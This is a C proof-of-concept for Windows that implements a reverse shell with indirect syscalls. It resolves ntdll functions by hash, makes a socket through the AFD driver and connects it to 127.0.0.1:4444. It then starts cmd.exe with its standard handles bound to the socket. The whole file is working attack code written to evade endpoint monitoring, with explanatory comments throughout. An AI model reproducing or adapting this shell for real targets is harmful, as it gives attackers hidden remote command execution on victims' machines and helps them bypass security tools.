#include <windows.h>
#include "advanced.h"
#include "ntdll.h"
#include "winsock2.h"

// Reverse Shell with Indirect Syscalls.
// 
// This proof-of-concept is designed to
// be standalone, and the principles are
// applied to the shellcode methods.
// Conventions including dynamically
// resolving module pointers and functions
// are applied to shellcode as well.
// 
//               .,u%:;-..
//            ,d$$$$7^^?$i;.
//          ,' /^$S'    `?$i:.
//         j ,'  I$,     jb.:i:
//       ,$S$$b,j$S$$bupd$'.:i;.
//       ,//:"?a$$SI$?S$$b,:iIi:.
//         '   '/?$*'   -*?L':i::
//               ^,'.  j?'b,\ .::
//       .,           .7i_,   .:.
//       ip,i/:|,     d?i7'   . 
//      j7j$$Sp,u,+,.p$?'  ,:'
//      $d$$$SSIiS$$7j7?i:
//         '^"="^'^'^"

#define ROR7_32__NtCreateFile                   0x4489294C
#define ROR7_32__NtDeviceIoControlFile          0x7FB40DDF
#define ROR7_32__NtCreateUserProcess            0x0C43BACB
#define ROR7_32__RtlInitUnicodeString           0x05D93FE7
#define ROR7_32__RtlCreateProcessParametersEx   0x90E3A882

NTDLL_API gNtdllApi = { 0 };

VOID INIT_NTDLL_API() {
        GET_NTDLL_FUN(
                ROR7_32__NtCreateFile, 
                &gNtdllApi.NtCreateFile
        );
        GET_NTDLL_FUN(
                ROR7_32__NtCreateUserProcess, 
                &gNtdllApi.NtCreateUserProcess
        );
        GET_NTDLL_FUN(
                ROR7_32__NtDeviceIoControlFile, 
                &gNtdllApi.NtDeviceIoControlFile
        );
        GET_NTDLL_FUN(
                ROR7_32__RtlInitUnicodeString, 
                &gNtdllApi.RtlInitUnicodeString
        );
        GET_NTDLL_FUN(
                ROR7_32__RtlCreateProcessParametersEx, 
                &gNtdllApi.RtlCreateProcessParametersEx
        );
}

// Windows ABI follows a standard calling convention.
//
// RCX                          => 1st parameter
// RDX                          => 2nd parameter
// R8                           => 3rd parameter
// R9                           => 4th parameter
// [RSP + 0x20]                 => 5th parameter
// [RSP + 0x28]                 => 6th parameter
// ...
// [RSP + 0x00 .. 0x018] Belong to the functions
// being called. This stack space is used to save
// any arguments that as may need be.

VOID main() {
        INIT_NTDLL_API();

        // Creating a socket requires requesting a file
        // handle from the networking driver. NtCreateFile
        // requires 11 parameters.
        //
        // RCX                  => Pointer to handle.
        // RDX                  => Desired access.
        // R8                   => Object attributes.
        // R9                   => IO Status.
        // [RSP + 0x20]         => Allocation size.
        // [RSP + 0x28]         => File attributes.
        // [RSP + 0x30]         => Share access.
        // [RSP + 0x38]         => Create disposition.
        // [RSP + 0x40]         => Create options.
        // [RSP + 0x48]         => EA buffer.
        // [RSP + 0x50]         => EA length.
        //
        // The only 2 that I know may be zero are
        // allocation size and file attributes.

        SOCKET Socket;
        IO_STATUS_BLOCK IoStatusBlock;
        UNICODE_STRING DeviceName;
        OBJECT_ATTRIBUTES ObjectAttributes                      = {
                .ObjectName                                     = &DeviceName,
                .Length                                         = sizeof(OBJECT_ATTRIBUTES),
                .Attributes                                     = 0x42
        };
        AFD_CREATE_CONTEXT AfdCreateContext                     = { 
                .Unknown1                                       = (ULONG_PTR) -1, 
                .Unknown2                                       = (ULONG) -1 
        };
        AFD_OPEN_PACKET_EA AfdOpenPacketEa                      = {
                .EaNameLength                                   = 0x0F,
                .EaValueLength                                  = 0x1E,
                .AddressFamily                                  = AF_INET,
                .SocketType                                     = SOCK_STREAM,
                .Protocol                                       = IPPROTO_TCP,
                .pAfdCreateContext                              = &AfdCreateContext,
        };

        for (INT i = 0; i <= 15; i++)
                AfdOpenPacketEa.EaName[i]                       = "AfdOpenPacketXX"[i];

        SET_SYSCALL(gNtdllApi.RtlInitUnicodeString);
        RUN_SYSCALL(
                &DeviceName, 
                L"\\Device\\Afd\\Endpoint"
        );

        SET_SYSCALL(gNtdllApi.NtCreateFile);
        if (!NT_SUCCESS(RUN_SYSCALL(
                &Socket,
                GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
                &ObjectAttributes,
                &IoStatusBlock,
                ZERO,
                ZERO,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                FILE_OPEN_IF,
                FILE_SYNCHRONOUS_IO_NONALERT,
                &AfdOpenPacketEa,
                sizeof(AfdOpenPacketEa)
        )))
                return;
        
        // NtDeviceIoControlFile requires 10 parameters.
        // A bind must come before a connection.
        //
        // RCX                  => Pointer to handle.
        // RDX                  => Event handle.
        // R8                   => Pointer to APC routine.
        // R9                   => Pointer to APC context.
        // [RSP + 0x20]         => IO Status.
        // [RSP + 0x28]         => Control Code (Bind).
        // [RSP + 0x30]         => Pointer to input buffer.
        // [RSP + 0x38]         => Input length.
        // [RSP + 0x40]         => Pointer to output buffer.
        // [RSP + 0x48]         => Output length.
        //
        // Event handle, APC routine, APC context may all be
        // zero.

        AFD_BIND_SOCKET AfdBindSocket                           = { 
                .Flags                                          = 2,
                .address.sa_family                              = AF_INET
        };
        CHAR OutputBuffer[16];

        SET_SYSCALL(gNtdllApi.NtDeviceIoControlFile);
        if (!NT_SUCCESS(RUN_SYSCALL(
                Socket,
                NULL,
                NULL,
                NULL,
                &IoStatusBlock,
                IOCTL_AFD_BIND,
                &AfdBindSocket,
                sizeof(AFD_BIND_SOCKET),
                &OutputBuffer,
                sizeof(OutputBuffer)
        )))
                return;

        // Connecting.
        //
        // RCX                  => Pointer to handle.
        // RDX                  => Event handle.
        // R8                   => Pointer to APC routine.
        // R9                   => Pointer to APC context.
        // [RSP + 0x20]         => IO Status.
        // [RSP + 0x28]         => Control Code (Connect).
        // [RSP + 0x30]         => Pointer to input buffer.
        // [RSP + 0x38]         => Input length.
        // [RSP + 0x40]         => Pointer to output buffer.
        // [RSP + 0x48]         => Output length.
        //
        // Event handle, APC routine, APC context, output
        // buffer/length may all be zero.

        AFD_CONNECT_SOCKET AfdConnectSocket                     = { 
                .address.sa_family                              = AF_INET
        };

        for (INT i = 0; i <= 6; i++)
                AfdConnectSocket.address.sa_data[i]             = "\x11\x5C\x7F\x00\x00\x01"[i]; // 127.0.0.1:4444 => "\x11\x5C\x7F\x00\x00\x01"

        SET_SYSCALL(gNtdllApi.NtDeviceIoControlFile);
        if (!NT_SUCCESS(RUN_SYSCALL(
                Socket,
                NULL,
                NULL,
                NULL,
                &IoStatusBlock,
                IOCTL_AFD_CONNECT,
                &AfdConnectSocket,
                sizeof(AFD_CONNECT_SOCKET),
                &OutputBuffer,
                sizeof(OutputBuffer)
        )))
                return;

        // NtCreateUserProcess requires 11 parameters. This
        // is the most bare-bones that I have gotten to work.
        //
        // RCX                  => Pointer to process handle.
        // RDX                  => Pointer to thread handle.
        // R8                   => Process access.
        // R9                   => Thread access.
        // [RSP + 0x20]         => Process attributes.
        // [RSP + 0x28]         => Thread attriutes.
        // [RSP + 0x30]         => Process flags.
        // [RSP + 0x38]         => Thread flags.
        // [RSP + 0x40]         => Process parameters..
        // [RSP + 0x48]         => Creation info.
        // [RSP + 0x50]         => Attribute list.
        //
        // Event handle, APC routine, APC context, output
        // buffer/length may all be zero.

        HANDLE hProcess;
        HANDLE hThread;

        UNICODE_STRING NtImagePath;
        SET_SYSCALL(gNtdllApi.RtlInitUnicodeString);
        RUN_SYSCALL(
                &NtImagePath, 
                L"\\??\\C:\\Windows\\System32\\cmd.exe"
        );

        PRTL_USER_PROCESS_PARAMETERS pUserProcessParameters;
        SET_SYSCALL(gNtdllApi.RtlCreateProcessParametersEx);
        RUN_SYSCALL(
                &pUserProcessParameters, 
                &NtImagePath, 
                NULL, 
                NULL, 
                NULL, 
                NULL, 
                NULL, 
                NULL, 
                NULL, 
                NULL, 
                1
        );
        pUserProcessParameters->ConsoleHandle                   = NtCurrentConsole();
        pUserProcessParameters->WindowFlags                     = 0x00000100;
        pUserProcessParameters->StandardInput                   = Socket;
        pUserProcessParameters->StandardOutput                  = Socket;
        pUserProcessParameters->StandardError                   = Socket;

        PS_CREATE_INFO PsCreateInfo                             = { 
                .Size                                           = sizeof(PS_CREATE_INFO)
        };

        PS_ATTRIBUTE_LIST AttributeList                         = { 
                .TotalLength                                    = sizeof(PS_ATTRIBUTE_LIST),
                .Attributes[0].Attribute                        = PS_ATTRIBUTE_IMAGE_NAME,
                .Attributes[0].Size                             = NtImagePath.Length,
                .Attributes[0].Value                            = (ULONG_PTR) NtImagePath.Buffer
        };

        SET_SYSCALL(gNtdllApi.NtCreateUserProcess);
        if (!NT_SUCCESS(RUN_SYSCALL(
                &hProcess,
                &hThread,
                PROCESS_ALL_ACCESS,
                THREAD_ALL_ACCESS,
                NULL,
                NULL,
                PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
                THREAD_CREATE_FLAGS_NONE,
                pUserProcessParameters,
                &PsCreateInfo,
                &AttributeList
        )))
                return;
}